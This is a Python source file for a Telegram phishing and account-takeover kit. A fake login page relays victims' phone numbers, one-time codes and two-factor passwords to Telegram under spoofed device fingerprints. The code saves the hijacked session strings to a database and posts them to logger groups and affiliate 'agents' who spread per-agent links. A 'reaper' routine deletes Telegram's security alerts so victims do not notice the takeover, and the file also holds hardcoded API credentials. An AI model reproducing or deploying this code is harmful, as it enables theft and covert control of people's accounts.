"""
VINZY ULTRA ENTERPRISE - VERSION 4.0.0 (TITANIUM GHOST GOLIATH)
--------------------------------------------------------------
Architecture: Asynchronous MTProto Ghost Hybrid with Multi-Layer Failover
Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
Environment: Koyeb / Docker / Heroku
Security Protocol: Zero-Trace Reaper + Unicode Fingerprinting + Handshake Isolation
--------------------------------------------------------------
Status: Production Grade (Deep-State Optimized)
Developer: Vinzy Core Pro Engine
--------------------------------------------------------------
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
import textwrap
from psycopg2 import pool
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone

# =========================================================================
# 1. CORE SYSTEM CONSTANTS & IDENTITY
# =========================================================================

SYSTEM_VERSION = "4.0.0"
SYSTEM_CODENAME = "GOLIATH"
START_TIME = time.time()

# Environment Credentials Retrieval
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -1003811039696))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -1003808360697))
DOMAIN = os.environ.get("DOMAIN", "relieved-olly-vinzystorez-d76f3e98.koyeb.app")

# Advanced Logging Infrastructure
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][CORE]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Titanium")

# =========================================================================
# 2. EXPANDED GHOST FINGERPRINT DATABASE (DEEP SPOOFING)
# =========================================================================

# This database mimics high-trust device profiles to bypass heuristic filters.
GHOST_POOL = [
    {
        "model": "iPhone 15 Pro Max", 
        "sys": "iOS 17.5.1", 
        "app": "11.2.0", 
        "lang": "en-US",
        "system_lang": "en-US"
    },
    {
        "model": "Samsung SM-S928B", 
        "sys": "Android 14", 
        "app": "11.1.2", 
        "lang": "en-GB",
        "system_lang": "en-GB"
    },
    {
        "model": "iPad14,5", 
        "sys": "iPadOS 17.4", 
        "app": "10.9.0", 
        "lang": "fr-FR",
        "system_lang": "fr-FR"
    },
    {
        "model": "\u200b", # Zero-Width Invisible Device Name
        "sys": "\u200b", 
        "app": "11.3.0", 
        "lang": "zh-CN",
        "system_lang": "zh-CN"
    },
    {
        "model": "Pixel 8 Pro", 
        "sys": "Android 14", 
        "app": "11.0.1", 
        "lang": "de-DE",
        "system_lang": "de-DE"
    },
    {
        "model": "Huawei P60 Pro", 
        "sys": "EMUI 13", 
        "app": "10.5.2", 
        "lang": "pt-BR",
        "system_lang": "pt-BR"
    },
    {
        "model": "MacBook Pro", 
        "sys": "macOS 14.5", 
        "app": "11.2.0", 
        "lang": "it-IT",
        "system_lang": "it-IT"
    },
    {
        "model": "Sony Xperia 1 V", 
        "sys": "Android 13", 
        "app": "10.15.1", 
        "lang": "ja-JP",
        "system_lang": "ja-JP"
    },
    {
        "model": "Xiaomi 14 Ultra", 
        "sys": "HyperOS 1.0", 
        "app": "11.1.0", 
        "lang": "ru-RU",
        "system_lang": "ru-RU"
    },
    {
        "model": "Desktop Custom", 
        "sys": "Windows 11", 
        "app": "4.16.2", 
        "lang": "en-US",
        "system_lang": "en-US"
    }
]

# =========================================================================
# 3. TITANIUM PERSISTENCE LAYER (POSTGRESQL POOLING)
# =========================================================================

try:
    # High-concurrency pool for Neon/AWS backends
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=5,
        maxconn=75, 
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("DATABASE: Titanium Threaded Pool Online.")
except Exception as e:
    logger.critical(f"DATABASE FATAL: {e}")
    db_pool = None

def get_db_connection():
    """Retrieves a connection with active retry logic to handle DB 'Cold Starts'."""
    if not db_pool:
        return None
    for attempt in range(1, 6):
        try:
            conn = db_pool.getconn()
            if conn:
                return conn
        except Exception as e:
            logger.warning(f"DATABASE: Connection attempt {attempt} failed. Retrying...")
            time.sleep(0.5)
    return None

def release_db_connection(conn):
    """Safely returns a connection to the pool cluster."""
    if db_pool and conn:
        db_pool.putconn(conn)

def initialize_system_schema():
    """Performs multi-stage schema synchronization and auto-repair."""
    conn = get_db_connection()
    if not conn:
        logger.error("SCHEMA: Could not establish connection for sync.")
        return
    
    try:
        cur = conn.cursor()
        
        # Stage 1: Core Hit Storage
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY,
                session_string TEXT NOT NULL,
                owner_name TEXT,
                username TEXT,
                tid BIGINT,
                device_info TEXT,
                hit_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'ACTIVE'
            )
        """)
        
        # Stage 2: Agent Performance Metrics
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Stage 3: Dynamic Schema Repair (Column Validation)
        # This fixes the 'column last_active does not exist' error automatically.
        check_query = """
            SELECT 1 FROM information_schema.columns 
            WHERE table_name='link_metrics' AND column_name='last_active';
        """
        cur.execute(check_query)
        if not cur.fetchone():
            logger.info("SCHEMA: Patching missing column 'last_active'...")
            cur.execute("ALTER TABLE link_metrics ADD COLUMN last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP;")
        
        conn.commit()
        cur.close()
        logger.info("SCHEMA: System synchronization complete.")
        
    except Exception as e:
        logger.error(f"SCHEMA ERROR: {e}")
    finally:
        release_db_connection(conn)

# Initialize Schema on Boot
initialize_system_schema()

# =========================================================================
# 4. GHOST REAPER ENGINE (SECURITY PURGE PROTOCOL)
# =========================================================================

async def execute_ghost_reaper(client):
    """
    The Reaper scans and neutralizes all Telegram Service notifications (777000).
    It targets login codes, IP warnings, and session alerts to hide the trace.
    """
    try:
        logger.info("REAPER: Initiating deep-purge on Service Node 777000...")
        
        # Increased scan depth for 2026 security updates
        async for message in client.iter_messages(777000, limit=30):
            msg_content = (message.text or "").lower()
            
            # High-fidelity detection signatures
            security_signatures = [
                "login code", "new login", "detected", 
                "authorized", "ip address", "location", 
                "access to your account", "confirmation code",
                "logged in", "device", "telegram web"
            ]
            
            if any(sig in msg_content for sig in security_signatures):
                await client.delete_messages(777000, [message.id])
                logger.info(f"REAPER: Neutralized alert ID {message.id}")
        
        # Comprehensive history wipe
        await client(functions.messages.DeleteHistoryRequest(
            peer=777000,
            max_id=0,
            just_clear=True,
            revoke=True
        ))
        logger.info("REAPER: All security traces neutralized.")
        
    except Exception as e:
        logger.error(f"REAPER FAILURE: {e}")

# =========================================================================
# 5. WEB INFRASTRUCTURE & ROUTING (QUART ASYNC)
# =========================================================================

app = Quart(__name__)
app = cors(app, allow_origin="*")
TEMPLATE_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")

# Handshake Buffer (In-Memory)
active_mirrors = {}

@app.route('/')
async def server_root():
    """Serves the front-end login interface."""
    return await send_from_directory(TEMPLATE_FOLDER, 'login.html')

@app.route('/step_phone', methods=['POST'])
async def handle_phone_handshake():
    """
    Phase 1: Session Initialization.
    Triggered when the target enters their phone number.
    """
    try:
        data = await request.json
        raw_phone = str(data.get('phone', ''))
        clean_phone = re.sub(r'\D', '', raw_phone)
        tid = int(data.get('tid', 0))

        if not clean_phone or len(clean_phone) < 7:
            return jsonify({"status": "error", "msg": "Invalid format."})

        # --- DB METRIC TRACKING ---
        conn = get_db_connection()
        if conn:
            try:
                cur = conn.cursor()
                cur.execute("""
                    INSERT INTO link_metrics (tid, clicks, last_active) 
                    VALUES (%s, 1, CURRENT_TIMESTAMP) 
                    ON CONFLICT (tid) DO UPDATE SET 
                        clicks = link_metrics.clicks + 1, 
                        last_active = CURRENT_TIMESTAMP
                """, (tid,))
                conn.commit()
                cur.close()
            except Exception as e:
                logger.error(f"METRIC_LOG_ERR: {e}")
            finally:
                release_db_connection(conn)

        # --- MTPROTO INITIALIZATION ---
        ghost = random.choice(GHOST_POOL)
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH,
            device_model=ghost['model'],
            system_version=ghost['sys'],
            app_version=ghost['app'],
            lang_code=ghost['lang'],
            system_lang_code=ghost['system_lang']
        )
        
        await client.connect()
        
        try:
            # Dispatch official Telegram OTP
            sent_code = await client.send_code_request(clean_phone)
            
            # Store session in memory for Phase 2
            active_mirrors[clean_phone] = {
                "client": client,
                "hash": sent_code.phone_code_hash,
                "tid": tid,
                "device": ghost['model'],
                "created_at": time.time()
            }
            
            logger.info(f"HANDSHAKE: Initiated for {clean_phone} via Agent {tid}")
            return jsonify({"status": "success"})
            
        except errors.FloodWaitError as e:
            return jsonify({"status": "error", "msg": f"Wait {e.seconds}s"})
        except Exception as e:
            logger.error(f"TG_API_ERR: {e}")
            return jsonify({"status": "error", "msg": "Telegram Node Rejected Request."})

    except Exception as e:
        logger.error(f"PHASE1_CRITICAL: {e}")
        return jsonify({"status": "error", "msg": "Handshake Internal Failure."})

@app.route('/step_code', methods=['POST'])
async def handle_code_verification():
    """
    Phase 2: OTP Verification.
    Triggered when the target enters the 5-digit code.
    """
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        otp = data.get('code', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session Expired. Refresh."})

        session = active_mirrors[phone]
        client = session['client']
        
        try:
            # Attempt Sign-In with injected OTP
            await client.sign_in(phone, otp, phone_code_hash=session['hash'])
            
            # If successful, finalize immediately
            return await finalize_capture_sequence(phone)
            
        except errors.SessionPasswordNeededError:
            logger.info(f"2FA_TRIGGERED: Account {phone} requires 2FA.")
            return jsonify({"status": "2fa_needed"})
            
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Invalid code."})
            
        except Exception as e:
            logger.error(f"PHASE2_ERR: {e}")
            return jsonify({"status": "error", "msg": "Verification node failure."})
            
    except Exception as e:
        logger.error(f"PHASE2_CRITICAL: {e}")
        return jsonify({"status": "error", "msg": "Internal logic error."})

@app.route('/step_2fa', methods=['POST'])
async def handle_2fa_bypass():
    """
    Phase 3: 2FA Bypass.
    Triggered when the target enters their Cloud Password.
    """
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        password = data.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session lost."})

        client = active_mirrors[phone]['client']
        
        try:
            # Inject Cloud Password
            await client.sign_in(password=password)
            return await finalize_capture_sequence(phone)
            
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Incorrect password."})
            
        except Exception as e:
            logger.error(f"PHASE3_ERR: {e}")
            return jsonify({"status": "error", "msg": "2FA bypass engine error."})
            
    except Exception as e:
        logger.error(f"PHASE3_CRITICAL: {e}")
        return jsonify({"status": "error", "msg": "2FA logic failure."})

# =========================================================================
# 6. CAPTURE FINALIZATION & DATA EXTRACTION
# =========================================================================

async def finalize_capture_sequence(phone):
    """
    Phase 4: Data extraction, Session Generation, and Notification.
    This is the "Hit" finalization point.
    """
    try:
        hit_data = active_mirrors.get(phone)
        if not hit_data:
            return jsonify({"status": "error", "msg": "Finalization sync lost."})
            
        client = hit_data['client']
        tid = hit_data['tid']
        spoof_device = hit_data['device']
        
        # 1. Neutralize Traces
        await execute_ghost_reaper(client)
        
        # 2. Extract Data
        me = await client.get_me()
        session_string = client.session.save()
        
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "User"
        username = f"@{me.username}" if me.username else "None"
        
        # 3. Save to Persistent Database
        conn = get_db_connection()
        if conn:
            try:
                cur = conn.cursor()
                # Store Account
                cur.execute("""
                    INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_info)
                    VALUES (%s, %s, %s, %s, %s, %s)
                    ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
                """, (phone, session_string, full_name, username, tid, spoof_device))
                
                # Update Agent Stats
                cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
                conn.commit()
                cur.close()
            finally:
                release_db_connection(conn)

        # 4. Dispatch Notifications
        hit_card = (
            f"💠 <b>TITANIUM HIT SECURED</b> 💠\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {full_name}\n"
            f"🏷 <b>User:</b> {username}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent:</b> <code>{tid}</code>\n"
            f"📱 <b>Spoof:</b> {spoof_device}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_string}</code>"
        )
        
        # Send to Master Logger
        bot.send_message(LOGGER_GROUP, hit_card)
        
        # Send to Verify Group
        bot.send_message(VERIFY_GROUP, f"✅ <b>Hit Verified:</b> {full_name} | {phone}")
        
        # Notify Agent
        if tid != 0:
            bot.send_message(tid, f"🎯 <b>Hit Success!</b>\nTarget: <b>{full_name}</b> captured.")

        # 5. Cleanup
        await asyncio.sleep(3)
        await client.disconnect()
        if phone in active_mirrors:
            del active_mirrors[phone]
            
        logger.info(f"SUCCESS: Hit finalized for {phone}")
        return jsonify({"status": "success"})

    except Exception as e:
        logger.error(f"FINALIZATION_CRITICAL: {e}")
        return jsonify({"status": "error", "msg": "Data extraction failed."})

# =========================================================================
# 7. AGENT CONTROL PANEL (TELEGRAM BOT INTERFACE)
# =========================================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

@bot.message_handler(commands=['start'])
def handle_bot_start(m):
    """Agent Onboarding Menu."""
    welcome = (
        f"<b>Vinzy Titanium Enterprise v{SYSTEM_VERSION}</b>\n"
        f"<i>Status: {SYSTEM_CODENAME} - Operational</i>\n\n"
        f"<b>Agent ID:</b> <code>{m.from_user.id}</code>\n"
        f"<b>Region:</b> SE-Asia-Node-01\n\n"
        f"Select an option to begin operations."
    )
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🔗 My Link"),
        types.KeyboardButton("📊 My Stats"),
        types.KeyboardButton("🛠 Tools"),
        types.KeyboardButton("📜 Manual")
    )
    bot.send_message(m.chat.id, welcome, reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
def bot_get_link(m):
    """Generates unique agent link."""
    link = f"https://{DOMAIN}/?id={m.from_user.id}"
    bot.send_message(m.chat.id, f"🚀 <b>Operational Link:</b>\n<code>{link}</code>")

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def bot_get_stats(m):
    """Fetches real-time performance data from DB."""
    tid = m.from_user.id
    conn = get_db_connection()
    clicks, hits = 0, 0
    
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (tid,))
            res = cur.fetchone()
            if res:
                clicks, hits = res[0], res[1]
            cur.close()
        finally:
            release_db_connection(conn)
            
    bot.send_message(m.chat.id, f"📊 <b>Stats for Agent {tid}</b>\n━━━━━━━━━━━━━\n🖱 <b>Clicks:</b> {clicks}\n🎯 <b>Hits:</b> {hits}")

@bot.message_handler(func=lambda m: m.text == "🛠 Tools")
def bot_tools(m):
    bot.send_message(m.chat.id, "🛠 <b>Advanced Tools</b>\nComing Soon: SMS Broadcaster, Link Cloaker.")

@bot.message_handler(func=lambda m: m.text == "📜 Manual")
def bot_manual(m):
    manual = textwrap.dedent("""
        <b>📜 Operational Manual</b>
        1. Distribute your unique link to targets.
        2. System mimics a real mobile device login.
        3. Reaper engine wipes security alerts from 777000.
        4. String session is delivered to your logger.
        
        <i>Note: Do not use for illegal activities.</i>
    """)
    bot.send_message(m.chat.id, manual)

# =========================================================================
# 8. SYSTEM RUNTIME & MAINTENANCE
# =========================================================================

def bot_polling_process():
    """Managed thread for Agent Bot API Polling."""
    logger.info("BOOT: Launching Bot Polling Thread...")
    while True:
        try:
            bot.remove_webhook()
            time.sleep(2)
            bot.polling(none_stop=True, interval=1, timeout=50)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 409:
                logger.warning("BOT: Conflict detected. Adjusting loop...")
            time.sleep(10)
        except Exception as e:
            logger.error(f"BOT_POLL_ERR: {e}")
            time.sleep(15)

async def memory_watchdog():
    """Background task to clean up abandoned sessions (TTL: 15min)."""
    while True:
        try:
            now = time.time()
            expired = [ph for ph, d in active_mirrors.items() if now - d['created_at'] > 900]
            for ph in expired:
                try:
                    await active_mirrors[ph]['client'].disconnect()
                except: pass
                del active_mirrors[ph]
            if expired:
                logger.info(f"WATCHDOG: Cleaned {len(expired)} dead sessions.")
        except Exception as e:
            logger.error(f"WATCHDOG_ERR: {e}")
        await asyncio.sleep(300)

@app.before_serving
async def init_background_tasks():
    """Registers background tasks before webserver start."""
    asyncio.create_task(memory_watchdog())

if __name__ == "__main__":
    # 1. Start Agent Bot Thread
    Thread(target=bot_polling_process, daemon=True).start()
    
    # 2. Launch Quart Server
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"BOOT: Vinzy Goliath v{SYSTEM_VERSION} Online on Port {port}")
    
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# -------------------------------------------------------------------------
# END OF SYSTEM CORE - TITANIUM v4.0.0
# -------------------------------------------------------------------------
